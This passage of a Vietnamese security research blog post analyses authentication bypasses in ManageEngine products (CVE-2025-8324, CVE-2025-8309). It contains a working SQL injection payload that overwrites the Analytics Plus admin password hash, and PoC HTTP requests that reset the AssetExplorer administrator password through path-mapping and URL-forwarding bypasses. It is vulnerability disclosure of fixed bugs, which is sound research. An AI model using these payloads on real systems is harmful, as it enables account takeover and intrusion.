+<li><code>$2a$10$5gzarCsB3OlJLGsXSVauP.z0zaH3DH/CjMlv.ybV6hPkgCXaN6Gj.</code>: bcrypt hash của <code>Abcd@1231</code></li>
+<li><code>user_auto_id=8:</code> id của admin account</li>
+</ul>
+<p>Vì dấu nháy sẽ bị escape, payload cần tránh dùng ký tự này. Ở đây có khá nhiều cách để xử lý, nhưng đơn giản nhất với mình vẫn là dùng function <code>chr()</code> để convert giá trị ASCII thành ký tự rồi nối lại thành string cho đoạn bcrypt hash. Full payload:</p>
+<pre tabindex="0"><code class="language-!" data-lang="!">GET /connectoradmin/action/UPDATECONNECTORMETA/conndbinfoid/202/a.png?COLUMN=&lt;@urlencode&gt;VERSIONNO=1 where 1=0; update iamuserpassword set password=chr(36)||chr(50)||chr(97)||chr(36)||chr(49)||chr(48)||chr(36)||chr(53)||chr(103)||chr(122)||chr(97)||chr(114)||chr(67)||chr(115)||chr(66)||chr(51)||chr(79)||chr(108)||chr(74)||chr(76)||chr(71)||chr(115)||chr(88)||chr(83)||chr(86)||chr(97)||chr(117)||chr(80)||chr(46)||chr(122)||chr(48)||chr(122)||chr(97)||chr(72)||chr(51)||chr(68)||chr(72)||chr(47)||chr(67)||chr(106)||chr(77)||chr(108)||chr(118)||chr(46)||chr(121)||chr(98)||chr(86)||chr(54)||chr(104)||chr(80)||chr(107)||chr(103)||chr(67)||chr(88)||chr(97)||chr(78)||chr(54)||chr(71)||chr(106)||chr(46) where user_auto_id=8;--&lt;/@urlencode&gt;&amp;VALUE=test2&amp;TABLE=CustomConnectorInfo HTTP/1.1
+Host: &lt;host&gt;
+</code></pre><ul>
+<li><code>@urlencode</code> tag: phần cần url encode</li>
+</ul>
+<p><img src="/images/2026/Auth-Bypass-Across-ManageEngine-Products/sqli_success_update_password.png" alt="sqli_success_update_password"></p>
+<p>Đến đây có thể login admin account với password <code>Abcd@1231</code>.</p>
+<p>Với SQLi và quyền admin, việc leo lên Pre-auth RCE mình nghĩ chỉ là vấn đề thời gian. Tuy nhiên khi làm đến đây mình đã khá nản :(  bạn đọc có thể nghiên cứu thêm.</p>
+<h2 id="cve-2025-8309-assetexplorer-account-takeover">CVE-2025-8309: AssetExplorer Account Takeover</h2>
+<p>Advisory: <a href="https://www.manageengine.com/products/service-desk/cve-2025-8309.html">https://www.manageengine.com/products/service-desk/cve-2025-8309.html</a></p>
+<p>Tại configuration file <code>security/security-publicaccess.xml</code>, có 2 ActionRule sau cho static files:</p>
+<pre tabindex="0"><code>&lt;url path=&#34;^(?!/api/v3/).*\.(js|css|ico|svg|png|html)&#34; user_type=&#34;all&#34; static_files=&#34;true&#34; remote_server=&#34;true&#34;&gt;
+&lt;url path=&#34;^(?!/api/v3/).*\.(gif|jpg|jpeg|JPG|woff2|woff|otf|eot|txt)$&#34; user_type=&#34;all&#34; static_files=&#34;true&#34; remote_server=&#34;true&#34;&gt;
+</code></pre><ul>
+<li>path regex khá rộng, không bị prefix, requestURI chỉ cần match với suffix</li>
+<li>Đã blacklist prefix <code>/api/v3/</code></li>
+</ul>
+<p>Ngoài ra, với AssetExplorer, nếu rule không có attribute <code>ignore-extraparam=&quot;true&quot;</code> request không được có thêm param trừ danh sách đã được whitelist (2 rule trên không có param whitelist nào):
+<img src="/images/2026/Auth-Bypass-Across-ManageEngine-Products/css_200.png" alt="css_200">
+<img src="/images/2026/Auth-Bypass-Across-ManageEngine-Products/css_400.png" alt="css_400"></p>
+<p>Cùng với đó, dù các rule này không yêu cầu xác thực, nhưng trong <code>web.xml</code> của webapp, tag <code>&lt;security-constraint&gt;</code> đã mặc định tất cả các request cần xác thực, khiến bug thành Post-auth:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- Login required for the following URLs --&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;security-constraint&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;web-resource-collection&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;url-pattern&gt;</span>/*<span style="color:#f92672">&lt;/url-pattern&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/web-resource-collection&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;auth-constraint&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;role-name&gt;</span>*<span style="color:#f92672">&lt;/role-name&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/auth-constraint&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/security-constraint&gt;</span>
+</span></span></code></pre></div><p>Chỉ một số url là được whitelist không cần xác thực:</p>
+<pre tabindex="0"><code class="language-xml!" data-lang="xml!">&lt;security-constraint&gt;
+	&lt;web-resource-collection&gt;
+		&lt;web-resource-name&gt;Secured Core Context&lt;/web-resource-name&gt;
+		&lt;!-- For static files URLs --&gt;
+		&lt;url-pattern&gt;/scripts/*&lt;/url-pattern&gt;
+		&lt;url-pattern&gt;/images/*&lt;/url-pattern&gt;
+		&lt;url-pattern&gt;/favicon.ico&lt;/url-pattern&gt;
+		&lt;url-pattern&gt;/fonts/*&lt;/url-pattern&gt;
+		&lt;url-pattern&gt;/zohocomponents/*&lt;/url-pattern&gt;
+
+		&lt;!-- truncated... --&gt;
+	&lt;/web-resource-collection&gt;
+&lt;/security-constraint&gt;
+</code></pre><p>Anyway, tương tự với Analytics Plus, ta có thể lợi dụng các rule trên để match với bất kỳ servlet nào có wildcard mapping. Tránh rơi vào ActionRule yêu cầu role cao.</p>
+<p>Tuy nhiên như đã đề cập, request khi match các rule này không được chứa param nào, nên ta chỉ có thể kiểm soát requestURI, một hạn chế khá lớn.</p>
+<p>Vì mọi request cần được khai báo dưới dạng ActionRule, có thể lấy toàn bộ định dạng request bằng cách search theo regex sau:
+<img src="/images/2026/Auth-Bypass-Across-ManageEngine-Products/search_regex_url.png" alt="search_regex_url"></p>
+<p>Trong số đó, mình tìm được các rule sau, cho phép reset password thông qua user id lấy từ requestURI:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;url</span> <span style="color:#a6e22e">method=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">roles=</span><span style="color:#e6db74">&#34;SDSiteAdmin,SDAdmin&#34;</span> <span style="color:#a6e22e">path=</span><span style="color:#e6db74">&#34;/api/v3/users/(\d+)/(_?)reset_password&#34;</span> <span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;url</span> <span style="color:#a6e22e">method=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">roles=</span><span style="color:#e6db74">&#34;SDOrgAdmin&#34;</span> <span style="color:#a6e22e">path=</span><span style="color:#e6db74">&#34;/api/v3/orgusers/(\d+)/(_?)reset_password&#34;</span>  <span style="color:#a6e22e">user_type=</span><span style="color:#e6db74">&#34;all&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>Tuy nhiên 2 rule của static files đã blacklist prefix <code>/api/v3/</code>, có thể các api này trước đó đã bị lợi dụng ở CVE nào đó.</p>
+<p>Dù vậy mình vẫn tìm ra 2 cách để bypass giới hạn này.</p>
+<h3 id="case-1-bypass-using-other-mapping">Case 1: Bypass using other mapping</h3>
+<p><code>web.xml</code> map <code>/api/v3/</code> với class <code>SDPAPIV2Servlet</code>:</p>
+<pre tabindex="0"><code class="language-xml!" data-lang="xml!">&lt;servlet&gt;
+    &lt;servlet-name&gt;api/v3&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;com.manageengine.servicedesk.sdpapi.v2.servlet.SDPAPIV2Servlet&lt;/servlet-class&gt;
+&lt;/servlet&gt;
+
+&lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;api/v3&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/api/v3/*&lt;/url-pattern&gt;
+&lt;/servlet-mapping&gt;
+</code></pre><p>Mình tìm được một mapping khác cũng map vào class trên nhưng dùng <code>/apiv2/</code>:</p>
+<pre tabindex="0"><code class="language-xml!" data-lang="xml!">&lt;servlet&gt;
+    &lt;servlet-name&gt;apiv2&lt;/servlet-name&gt;
+    &lt;servlet-class&gt;com.manageengine.servicedesk.sdpapi.v2.servlet.SDPAPIV2Servlet&lt;/servlet-class&gt;
+&lt;/servlet&gt;
+
+&lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;apiv2&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/apiv2/*&lt;/url-pattern&gt;
+&lt;/servlet-mapping&gt;
+</code></pre><p>Thông thường, do không có ActionRule nào cho <code>/apiv2/*</code>, path này dù nằm trong mapping cũng không thể dùng được. Nhưng nếu kết hợp với 2 rule static files trên, ta có thể khiến request match vào rule static files để truy cập <code>SDPAPIV2Servlet</code>.</p>
+<p>PoC request reset password account có <code>id=2</code>, chính là <code>administrator</code>:</p>
+<pre tabindex="0"><code>GET /apiv2/orgusers/2/reset_password/a.woff HTTP/1.1
+Host: &lt;host&gt;
+Cookie: &lt;truncated&gt;
+</code></pre><p>Server sẽ trả về link sau để thực hiện reset password:
+<img src="/images/2026/Auth-Bypass-Across-ManageEngine-Products/apiv2_reset_password.png" alt="apiv2_reset_password"></p>
+<p>Đặt password mới:
+<img src="/images/2026/Auth-Bypass-Across-ManageEngine-Products/set_password.png" alt="set_password"></p>
+<p>Trong trường hợp không có mapping <code>/apiv2/*</code>, vẫn còn một cách khác là lợi dụng <code>StateFilter</code>.</p>
+<h3 id="case-2-bypass-via-url-forwarding">Case 2: Bypass via url forwarding</h3>
+<p>Request có prefix <code>/STATE_ID/*</code> sẽ đi qua <code>StateFilter</code>:</p>
+<pre tabindex="0"><code class="language-xml!" data-lang="xml!">&lt;filter&gt;
+    &lt;filter-name&gt;StateFilter&lt;/filter-name&gt;
+    &lt;filter-class&gt;com.adventnet.client.view.web.StateFilter&lt;/filter-class&gt;
+&lt;/filter&gt;
+
+&lt;filter-mapping&gt;
+    &lt;filter-name&gt;StateFilter&lt;/filter-name&gt;
+    &lt;url-pattern&gt;/STATE_ID/*&lt;/url-pattern&gt;
+&lt;/filter-mapping&gt;
+</code></pre><p>Class <code>StateFilter</code>:</p>
+<pre tabindex="0"><code class="language-java!" data-lang="java!">public class StateFilter implements Filter, WebConstants {
+        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
+        try {
+            StateParserGenerator.processState((HttpServletRequest)request, (HttpServletResponse)response); // [1]
+            String forwardPath = ((HttpServletRequest)request).getRequestURI();
+            if (WebClientUtil.isRestful((HttpServletRequest)request) &amp;&amp; forwardPath.indexOf(&#34;STATE_ID&#34;) == -1) {
+                chain.doFilter(request, response);
+            } else {
+                String path = this.getForwardPath((HttpServletRequest)request); // [2]
+                RequestDispatcher rd = request.getRequestDispatcher(path);
+                rd.forward(request, response); // [3]
+            }
+        // truncated
+    }
+
+    private String getForwardPath(HttpServletRequest request) {
+        String path = request.getContextPath() + &#34;/STATE_ID/&#34;;
+        String forwardPath = request.getRequestURI();
+        if (!forwardPath.startsWith(path)) {
+            return forwardPath;
+        } else {
+            int index = forwardPath.indexOf(47, path.length());
+            if (WebClientUtil.isRestful(request)) {
+                forwardPath = forwardPath.substring(path.length() - 1);
+            } else if (index &gt; 0) {
+                forwardPath = forwardPath.substring(index);
+            }
+
+            return forwardPath;
+    }
+}
+</code></pre><ul>
+<li>[1]: thực hiện parse State Cookie. Để tránh request lỗi, cookie cần có định dạng như sau: <code>Cookie: STATE_COOKIE=&amp;_REQS/_TIME/1993/;</code></li>
+<li>[2]: lấy forwardPath, cơ bản là cắt bỏ phần prefix <code>/STATE_ID/&lt;id&gt;</code>. Ví dụ <code>/STATE_ID/1/api/v3/</code> sẽ trở thành <code>/api/v3/</code></li>
+<li>[3]: Forward đến servlet</li>
+</ul>
+<p>Nhờ đó, với <code>/STATE_ID/1/api/v3/</code> -&gt; path không còn bắt đầu với <code>/api/v3/</code> -&gt; bypass blacklist regex. Bypass với request sau:</p>
+<pre tabindex="0"><code>GET /STATE_ID/1/api/v3/orgusers/2/reset_password/a.woff HTTP/1.1
+Host: &lt;host&gt;
+Cookie: STATE_COOKIE=&amp;_REQS/_TIME/1993/; &lt;truncated&gt;
+</code></pre><h2 id="others">Others</h2>
+<p>Một số products khác của ManageEngine cũng bị ảnh hưởng với root-cause tương tự khi tồn tại ActionRule có path regex không bị prefix.</p>
+<p>Với PAM360 - hay trước đây còn là Password Manager Pro:</p>
+<pre tabindex="0"><code class="language-xml!" data-lang="xml!">&lt;regexes&gt;
+    &lt;regex name=&#34;meagentacceptall&#34; value=&#34;.*&#34;/&gt;
+&lt;/regexes&gt;
+&lt;url path=&#34;/${meagentacceptall}/me-agent/${meagentacceptall}&#34; method=&#34;get&#34; threshold=&#34;30&#34; duration=&#34;1&#34; lock-period=&#34;5&#34; &gt;
+</code></pre><p>Tức path regex sẽ là:</p>
+<pre tabindex="0"><code>/.*/me-agent/.*
+</code></pre><p>Nhưng tương tự với AssetExplorer, rule này yêu cầu request phải được xác thực và không cho phép truyền param - khiến attack surface bị giới hạn. PAM360 có khá nhiều servlet với wildcard mapping, nhưng với giới hạn trên, PoC mình chỉ dừng lại ở info leaks, xóa 1 phần data hoặc DoS - vendor đã fix nhưng không đánh mã CVE.</p>
+<p>Một số products khác thì mình chưa tìm ra được impact cụ thể vì các giới hạn cũng như trên.</p>
+<p>That&rsquo;s all for now. Hope to see you soon in the next one.</p>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/posts">Archives</a></li>
+         
+          <li><a href="/notes">Notes</a></li>
+         
+          <li><a href="/about">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#securityfilter">SecurityFilter</a></li>
+    <li><a href="#cve-2025-8324-analytics-plus-authentication-bypass--sql-injection">CVE-2025-8324: Analytics Plus Authentication Bypass &amp; SQL Injection</a></li>
+    <li><a href="#cve-2025-8309-assetexplorer-account-takeover">CVE-2025-8309: AssetExplorer Account Takeover</a>
+      <ul>
+        <li><a href="#case-1-bypass-using-other-mapping">Case 1: Bypass using other mapping</a></li>
+        <li><a href="#case-2-bypass-via-url-forwarding">Case 2: Bypass via url forwarding</a></li>
+      </ul>
+    </li>
+    <li><a href="#others">Others</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2026%2fauth-bypass-across-manageengine-products%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2026%2fauth-bypass-across-manageengine-products%2f&text=Tales%20of%20Authentication%20Bypass%20Across%20ManageEngine%20Products" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2026%2fauth-bypass-across-manageengine-products%2f&title=Tales%20of%20Authentication%20Bypass%20Across%20ManageEngine%20Products" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2026%2fauth-bypass-across-manageengine-products%2f&is_video=false&description=Tales%20of%20Authentication%20Bypass%20Across%20ManageEngine%20Products" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Tales%20of%20Authentication%20Bypass%20Across%20ManageEngine%20Products&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2026%2fauth-bypass-across-manageengine-products%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2026%2fauth-bypass-across-manageengine-products%2f&title=Tales%20of%20Authentication%20Bypass%20Across%20ManageEngine%20Products" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2026%2fauth-bypass-across-manageengine-products%2f&title=Tales%20of%20Authentication%20Bypass%20Across%20ManageEngine%20Products" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2026%2fauth-bypass-across-manageengine-products%2f&name=Tales%20of%20Authentication%20Bypass%20Across%20ManageEngine%20Products&description=N%c4%83m%20ngo%c3%a1i%20m%c3%acnh%20c%c3%b3%20d%e1%bb%8bp%20target%20v%c3%a0%20t%c3%acm%20ra%20m%e1%bb%99t%20s%e1%bb%91%20l%e1%bb%97%20h%e1%bb%95ng%20tr%c3%aan%20c%c3%a1c%20s%e1%ba%a3n%20ph%e1%ba%a9m%20c%e1%bb%a7a%20Zoho%20ManageEngine.%20B%c3%a0i%20vi%e1%ba%bft%20s%e1%ba%bd%20chia%20s%e1%ba%bb%20l%e1%ba%a1i%20qu%c3%a1%20tr%c3%acnh%20n%c3%a0y.%0a%c4%90%e1%bb%83%20gi%e1%bb%9bi%20thi%e1%bb%87u%20qua%20th%c3%ac%20ManageEngine%20l%c3%a0%20b%e1%bb%99%20s%e1%ba%a3n%20ph%e1%ba%a9m%20IT%20management%20%c4%91%c6%b0%e1%bb%a3c%20nhi%e1%bb%81u%20t%e1%bb%95%20ch%e1%bb%a9c%20doanh%20nghi%e1%bb%87p%20tin%20d%c3%b9ng%2c%20tr%e1%ba%a3i%20d%c3%a0i%20t%e1%bb%ab%20IT%20helpdesk%2c%20AD%20management%2c%20cho%20%c4%91%e1%ba%bfn%20network%20v%c3%a0%20security%20monitoring.%20%c4%90i%e1%bb%83m%20%c4%91%c3%a1ng%20ch%c3%ba%20%c3%bd%20l%c3%a0%20do%20c%c3%b9ng%20chung%20m%e1%bb%99t%20d%c3%b2ng%20s%e1%ba%a3n%20ph%e1%ba%a9m%20n%c3%aan%20codebase%20c%c5%a9ng%20c%c3%b3%20nhi%e1%bb%81u%20%c4%91i%e1%bb%83m%20t%c6%b0%c6%a1ng%20%c4%91%e1%bb%93ng%20%e2%80%94%20nhi%e1%bb%81u%20th%c6%b0%20vi%e1%bb%87n%20d%c3%b9ng%20chung%2c%20pattern%20l%e1%ba%b7p%20l%e1%ba%a1i." aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2026%2fauth-bypass-across-manageengine-products%2f&t=Tales%20of%20Authentication%20Bypass%20Across%20ManageEngine%20Products" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2026  devme4f&#39;s blog 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">Archives</a></li>
+         
+        <li><a href="/notes">Notes</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+<script src=/js/code-copy.js></script>
+
+
+
+
+</html>
